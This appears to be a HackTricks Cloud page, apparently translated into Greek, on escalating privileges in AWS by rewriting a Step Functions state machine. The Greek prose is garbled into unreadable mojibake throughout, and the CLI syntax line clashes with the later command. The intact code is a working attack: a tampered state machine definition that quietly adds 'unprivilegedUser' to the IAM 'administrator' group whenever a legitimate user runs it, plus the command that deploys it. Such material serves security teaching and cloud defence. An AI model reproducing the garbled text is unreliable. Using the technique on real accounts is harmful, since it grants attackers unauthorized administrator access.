Î‘Î½Î¬Î»Î¿Î³Î± Î¼Îµ Ï„Î¿ Ï€ÏŒÏƒÎ¿ ÎµÏ€Î¹Ï„ÏÎµÏ€Ï„Î¹ÎºÏŒÏ‚ ÎµÎ¯Î½Î±Î¹ Î¿ IAM Î¡ÏŒÎ»Î¿Ï‚ Ï€Î¿Ï… ÏƒÏ‡ÎµÏ„Î¯Î¶ÎµÏ„Î±Î¹ Î¼Îµ Ï„Î· Î¼Î·Ï‡Î±Î½Î® ÎºÎ±Ï„Î±ÏƒÏ„Î¬ÏƒÎµÏ‰Î½, Î­Î½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¸Î± Î±Î½Ï„Î¹Î¼ÎµÏ„Ï‰Ï€Î¯ÏƒÎµÎ¹ 2 ÎºÎ±Ï„Î±ÏƒÏ„Î¬ÏƒÎµÎ¹Ï‚:

1. **Î•Ï€Î¹Ï„ÏÎµÏ€Ï„Î¹ÎºÏŒÏ‚ IAM Î¡ÏŒÎ»Î¿Ï‚**: Î•Î¬Î½ Î¿ IAM Î¡ÏŒÎ»Î¿Ï‚ Ï€Î¿Ï… ÏƒÏ‡ÎµÏ„Î¯Î¶ÎµÏ„Î±Î¹ Î¼Îµ Ï„Î· Î¼Î·Ï‡Î±Î½Î® ÎºÎ±Ï„Î±ÏƒÏ„Î¬ÏƒÎµÏ‰Î½ ÎµÎ¯Î½Î±Î¹ Î®Î´Î· ÎµÏ€Î¹Ï„ÏÎµÏ€Ï„Î¹ÎºÏŒÏ‚ (Î­Ï‡ÎµÎ¹ Î³Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Ï„Î·Î½ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ® **`arn:aws:iam::aws:policy/AdministratorAccess`** ÏƒÏ…Î½Î·Î¼Î¼Î­Î½Î·), Ï„ÏŒÏ„Îµ Î· Î¬Î´ÎµÎ¹Î± **`iam:PassRole`** Î´ÎµÎ½ Î¸Î± Î±Ï€Î±Î¹Ï„ÎµÎ¯Ï„Î±Î¹ Ï€ÏÎ¿ÎºÎµÎ¹Î¼Î­Î½Î¿Ï… Î½Î± ÎºÎ»Î¹Î¼Î±ÎºÏ‰Î¸Î¿ÏÎ½ Ï„Î± Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î±, ÎºÎ±Î¸ÏÏ‚ Î´ÎµÎ½ Î¸Î± ÎµÎ¯Î½Î±Î¹ Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„Î¿ Î½Î± ÎµÎ½Î·Î¼ÎµÏÏ‰Î¸ÎµÎ¯ ÎºÎ±Î¹ Î¿ IAM Î¡ÏŒÎ»Î¿Ï‚, Î¼Îµ Ï„Î¿Î½ Î¿ÏÎ¹ÏƒÎ¼ÏŒ Ï„Î·Ï‚ Î¼Î·Ï‡Î±Î½Î®Ï‚ ÎºÎ±Ï„Î±ÏƒÏ„Î¬ÏƒÎµÏ‰Î½ ÎµÎ¯Î½Î±Î¹ Î±ÏÎºÎµÏ„ÏŒÏ‚.
2. **ÎœÎ· ÎµÏ€Î¹Ï„ÏÎµÏ€Ï„Î¹ÎºÏŒÏ‚ IAM Î¡ÏŒÎ»Î¿Ï‚**: Î£Îµ Î±Î½Ï„Î¯Î¸ÎµÏƒÎ· Î¼Îµ Ï„Î·Î½ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î· Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ·, ÎµÎ´Ï Î­Î½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¸Î± Î±Ï€Î±Î¹Ï„Î®ÏƒÎµÎ¹ ÎµÏ€Î¯ÏƒÎ·Ï‚ Ï„Î·Î½ Î¬Î´ÎµÎ¹Î± **`iam:PassRole`** ÎºÎ±Î¸ÏÏ‚ Î¸Î± ÎµÎ¯Î½Î±Î¹ Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„Î¿ Î½Î± ÏƒÏ…ÏƒÏ‡ÎµÏ„Î¹ÏƒÏ„ÎµÎ¯ Î­Î½Î±Ï‚ ÎµÏ€Î¹Ï„ÏÎµÏ€Ï„Î¹ÎºÏŒÏ‚ IAM Î¡ÏŒÎ»Î¿Ï‚ Î¼Îµ Ï„Î· Î¼Î·Ï‡Î±Î½Î® ÎºÎ±Ï„Î±ÏƒÏ„Î¬ÏƒÎµÏ‰Î½ ÎµÎºÏ„ÏŒÏ‚ Î±Ï€ÏŒ Ï„Î·Î½ Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¯Î·ÏƒÎ· Ï„Î¿Ï… Î¿ÏÎ¹ÏƒÎ¼Î¿Ï Ï„Î·Ï‚ Î¼Î·Ï‡Î±Î½Î®Ï‚ ÎºÎ±Ï„Î±ÏƒÏ„Î¬ÏƒÎµÏ‰Î½.

{% code overflow="wrap" %}
```bash
aws states update-state-machine --state-machine-arn <value> [--definition <value>] [--role-arn <value>] [--logging-configuration <value>] \
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]
```
{% endcode %}

Î¤Î± Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Ï€Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î± Î´ÎµÎ¯Ï‡Î½Î¿Ï…Î½ Ï€ÏÏ‚ Î½Î± ÎµÎ½Î·Î¼ÎµÏÏÏƒÎµÏ„Îµ Î¼Î¹Î± Î½ÏŒÎ¼Î¹Î¼Î· Î¼Î·Ï‡Î±Î½Î® ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ·Ï‚ Ï€Î¿Ï… Î±Ï€Î»ÏÏ‚ ÎºÎ±Î»ÎµÎ¯ Î¼Î¹Î± ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· Lambda HelloWorld, Ï€ÏÎ¿ÎºÎµÎ¹Î¼Î­Î½Î¿Ï… Î½Î± Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎµÏ„Îµ Î¼Î¹Î± ÎµÏ€Î¹Ï€Î»Î­Î¿Î½ ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· Ï€Î¿Ï… Ï€ÏÎ¿ÏƒÎ¸Î­Ï„ÎµÎ¹ Ï„Î¿Î½ Ï‡ÏÎ®ÏƒÏ„Î· **`unprivilegedUser`** ÏƒÏ„Î·Î½ Î¿Î¼Î¬Î´Î± IAM **`administrator`**. ÎœÎµ Î±Ï…Ï„ÏŒÎ½ Ï„Î¿Î½ Ï„ÏÏŒÏ€Î¿, ÏŒÏ„Î±Î½ Î­Î½Î±Ï‚ Î½ÏŒÎ¼Î¹Î¼Î¿Ï‚ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Î¾ÎµÎºÎ¹Î½Î¬ Î¼Î¹Î± ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Ï„Î·Ï‚ ÎµÎ½Î·Î¼ÎµÏÏ‰Î¼Î­Î½Î·Ï‚ Î¼Î·Ï‡Î±Î½Î®Ï‚ ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ·Ï‚, Î±Ï…Ï„Î® Î· Î½Î­Î± ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î· ÎºÏÏ…Ï†Î® ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· Î¸Î± ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ ÎºÎ±Î¹ Î· ÎºÎ»Î¹Î¼Î¬ÎºÏ‰ÏƒÎ· Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½ Î¸Î± ÎµÎ¯Î½Î±Î¹ ÎµÏ€Î¹Ï„Ï…Ï‡Î®Ï‚.

{% hint style="warning" %}
Î•Î¬Î½ Î· Î¼Î·Ï‡Î±Î½Î® ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ·Ï‚ Î´ÎµÎ½ Î­Ï‡ÎµÎ¹ ÏƒÏ…ÏƒÏ‡ÎµÏ„Î¹ÏƒÎ¼Î­Î½Î¿ Î­Î½Î±Î½ ÎµÏ€Î¹Ï„ÏÎµÏ€Ï„Î¹ÎºÏŒ ÏÏŒÎ»Î¿ IAM, Î¸Î± Î±Ï€Î±Î¹Ï„ÎµÎ¯Ï„Î±Î¹ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î· Î¬Î´ÎµÎ¹Î± **`iam:PassRole`** Î³Î¹Î± Î½Î± ÎµÎ½Î·Î¼ÎµÏÏÏƒÎµÏ„Îµ Ï„Î¿Î½ ÏÏŒÎ»Î¿ IAM Ï€ÏÎ¿ÎºÎµÎ¹Î¼Î­Î½Î¿Ï… Î½Î± ÏƒÏ…ÏƒÏ‡ÎµÏ„Î¯ÏƒÎµÏ„Îµ Î­Î½Î±Î½ ÎµÏ€Î¹Ï„ÏÎµÏ€Ï„Î¹ÎºÏŒ ÏÏŒÎ»Î¿ IAM (Î³Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Î­Î½Î±Î½ Î¼Îµ Ï„Î·Î½ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ® **`arn:aws:iam::aws:policy/AdministratorAccess`** ÏƒÏ…Î½Î·Î¼Î¼Î­Î½Î·).
{% endhint %}

{% tabs %}
{% tab title="ÎÏŒÎ¼Î¹Î¼Î· ÎœÎ·Ï‡Î±Î½Î® ÎšÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ·Ï‚" %}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{% endtab %}

{% tab title="ÎšÎ±ÎºÏŒÎ²Î¿Ï…Î»Î· Î•Î½Î·Î¼ÎµÏÏ‰Î¼Î­Î½Î· ÎœÎ·Ï‡Î±Î½Î® ÎšÎ±Ï„Î±ÏƒÏ„Î¬ÏƒÎµÏ‰Î½" %}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "AddUserToGroup"
},
"AddUserToGroup": {
"Type": "Task",
"Parameters": {
"GroupName": "administrator",
"UserName": "unprivilegedUser"
},
"Resource": "arn:aws:states:::aws-sdk:iam:addUserToGroup",
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{% endtab %}
{% endtabs %}

* **Î•Î½Ï„Î¿Î»Î®** Ï€Î¿Ï… ÎµÎºÏ„ÎµÎ»Î­ÏƒÏ„Î·ÎºÎµ Î³Î¹Î± **Î½Î± ÎµÎ½Î·Î¼ÎµÏÏÏƒÎµÎ¹** **Ï„Î·Î½ ÎºÎ±Î½Î¿Î½Î¹ÎºÎ® Î¼Î·Ï‡Î±Î½Î® ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ·Ï‚**:

{% code overflow="wrap" %}
```bash
aws stepfunctions update-state-machine --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:HelloWorldLambda --definition file://StateMachineUpdate.json
{
"updateDate": "2024-07-10T20:07:10.294000+02:00",
"revisionId": "1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f"
}
```
{% endcode %}

**Î Î¹Î¸Î±Î½Î­Ï‚ Î•Ï€Î¹Ï€Ï„ÏÏƒÎµÎ¹Ï‚**: ÎœÎ· ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´Î¿Ï„Î·Î¼Î­Î½Î· ÎµÎºÏ„Î­Î»ÎµÏƒÎ· ÎºÎ±Î¹ Ï‡ÎµÎ¹ÏÎ¹ÏƒÎ¼ÏŒÏ‚ ÏÎ¿ÏÎ½ ÎµÏÎ³Î±ÏƒÎ¯Î±Ï‚ ÎºÎ±Î¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„Î¿Ï…Ï‚ Ï€ÏŒÏÎ¿Ï…Ï‚, Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î¿Î´Î·Î³Î®ÏƒÎµÎ¹ ÏƒÎµ ÏƒÎ·Î¼Î±Î½Ï„Î¹ÎºÎ­Ï‚ Ï€Î±ÏÎ±Î²Î¹Î¬ÏƒÎµÎ¹Ï‚ Î±ÏƒÏ†Î¬Î»ÎµÎ¹Î±Ï‚.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
